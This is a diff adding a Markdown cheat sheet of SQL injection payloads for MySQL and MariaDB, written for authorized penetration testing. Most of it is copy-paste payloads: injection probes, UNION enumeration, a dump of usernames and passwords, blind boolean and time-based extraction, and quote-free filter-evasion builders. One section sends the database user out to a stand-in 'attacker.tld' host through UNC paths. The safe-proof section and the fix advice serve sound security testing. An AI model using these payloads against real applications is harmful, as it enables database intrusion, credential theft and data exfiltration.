@@ -1,0 +1,190 @@
+---
+Vulnerability: SQLi
+Category: Payload
+DB: MySQL
+---
+# MySQL / MariaDB — SQLi Payloads
+
+> Copy‑paste ready snippets for **authorized** testing on MySQL 5.7/8.0 and MariaDB 10.x. Adjust quoting, column counts, and trailing comments to fit the target. Prefer minimal, non‑destructive proofs.
+
+==============================
+0) Conventions
+==============================
+- Trailing comments: try `-- -`, `#`, or `/* */` (note: `--` needs a trailing space/newline).
+- Placeholders:
+  - `<C>` = number of columns in the original SELECT.
+  - `<P>` = index of a printable (reflected) column.
+  - `<marker>` = unique token (e.g., `q9xZ2025`).
+- Hex to avoid quotes: `0x61646D696E` = `admin`.
+
+==============================
+1) Injection Sanity Checks
+==============================
+String context probes
+```
+'
+'-- -
+')-- -
+"-- +
+```
+Numeric context probes
+```
++1
+-1
+/0   -- if executed, should error
+```
+
+==============================
+2) Boolean Toggles (Blind baseline)
+==============================
+```
+' AND 1=1 -- -
+' AND 1=2 -- -
+```
+
+==============================
+3) Column Count Discovery (Union path)
+==============================
+`ORDER BY` method (increase until error)
+```
+' ORDER BY 5 -- -
+```
+NULL padding method
+```
+' UNION ALL SELECT NULL -- -
+' UNION ALL SELECT NULL,NULL -- -
+' UNION ALL SELECT NULL,NULL,NULL -- -
+```
+
+==============================
+4) Find a Printable Column
+==============================
+(Example assumes 3 columns; move the marker across positions)
+```
+' UNION ALL SELECT 1,2,3 -- -
+' UNION ALL SELECT 1,'<marker>',3 -- -
+' UNION ALL SELECT '<marker>',2,3 -- -
+' UNION ALL SELECT 1,2,'<marker>' -- -
+```
+
+==============================
+5) Fingerprint & Basics (Union)
+==============================
+(Assume 3 columns, 2nd is printable)
+```
+' UNION ALL SELECT 1,version(),3 -- -
+' UNION ALL SELECT 1,database(),3 -- -
+' UNION ALL SELECT 1,user(),3 -- -
+```
+
+==============================
+6) Schema Enumeration (Union)
+==============================
+```
+' UNION ALL SELECT 1,CONCAT_WS(':',table_schema,table_name),3 FROM information_schema.tables -- -
+' UNION ALL SELECT 1,CONCAT_WS(':',column_name,table_name),3 FROM information_schema.columns WHERE table_schema=database() -- -
+' UNION ALL SELECT 1,CONCAT(username,':',password),3 FROM users -- -
+```
+
+==============================
+7) Error‑based (if XML funcs present)
+==============================
+> **Heads‑up:** `EXTRACTVALUE()` / `UPDATEXML()` are removed on MySQL 8.0 but common on MariaDB/older MySQL. If blocked, use UNION/Blind instead.
+```
+' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT database()),0x7e)) -- -
+' AND UPDATEXML(1, CONCAT(0x7e,(SELECT user()),0x7e),1) -- -
+```
+
+==============================
+8) Boolean‑based Extraction
+==============================
+```
+' AND database()='appdb' -- -
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>10 -- -
+' AND ASCII(SUBSTRING((SELECT user()),1,1))>77 -- -
+```
+
+==============================
+9) Time‑based Extraction
+==============================
+```
+' AND SLEEP(3) -- -
+' AND IF((SELECT database())='appdb',SLEEP(3),0) -- -
+' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>77,SLEEP(3),0) -- -
+-- CPU alternative (noisy):
+' AND BENCHMARK(5000000,MD5('a')) -- -
+```
+
+==============================
+10) Clause‑Targeted Payloads
+==============================
+`ORDER BY` (identifier injection — prefer allowlists in fixes)
+```
+' ORDER BY 1 -- -
+' ORDER BY 1,2 -- -
+' ORDER BY (CASE WHEN database()='appdb' THEN 1 ELSE 2 END) -- -
+```
+`LIMIT / OFFSET` (blind iteration)
+```
+' LIMIT 0,1 -- -
+' LIMIT 1 OFFSET 0 -- -
+```
+
+==============================
+11) OOB / Filesystem (Windows‑biased; privileged)
+==============================
+> Use only with explicit permission. Behavior varies by OS/config.
+```
+-- Attempt DNS/SMB via UNC in LOAD_FILE (may trigger outbound lookup)
+' UNION ALL SELECT 1,LOAD_FILE(CONCAT('\\\\',HEX(USER()),'.attacker.tld\\x')),3 -- -
+
+-- Write to UNC share (requires FILE privilege)
+' UNION ALL SELECT 1,USER(),3 INTO OUTFILE '\\\\attacker.tld\\share\\mark.txt' -- -
+```
+
+==============================
+12) No‑quotes Builders (evade filters)
+==============================
+```
+' UNION ALL SELECT 1,CHAR(113,57,120,90),3 -- -            -- "q9xZ"
+' UNION ALL SELECT 1,0x7139785A,3 -- -                     -- 0x... hex
+' UNION ALL SELECT 1,CONCAT(0x71,0x39785a),3 -- -
+```
+
+==============================
+13) Versioned Comments & Splitting
+==============================
+```
+UNI/*!00000*/ON SE/*!00000*/LECT 1,version(),3
+S/**/LEEP(3)
+```
+
+==============================
+14) Safe Proof Patterns (minimal impact)
+==============================
+```
+-- Boolean flip
+' AND 1=1 -- -
+' AND 1=2 -- -
+
+-- Time blip (short)
+' AND SLEEP(2) -- -
+
+-- Marker echo (Union)
+' UNION ALL SELECT 1,'<marker>',3 -- -
+```
+
+==============================
+15) Quick Triage Checklist (use while testing)
+==============================
+- [ ] Context identified (string vs numeric) and comment style stabilized
+- [ ] Column count matched; printable column located
+- [ ] DB fingerprinted (version,user,database)
+- [ ] Proof via boolean/time established
+- [ ] Enumeration limited to necessity; **no bulk dumps**
+
+==============================
+16) Cleanup Reminders (if you created side‑effects)
+==============================
+- Drop any temp/test tables/files you created.
+- Hand over fixes: **prepared statements**, least‑privilege DB user, identifier allowlists, disable risky file features.
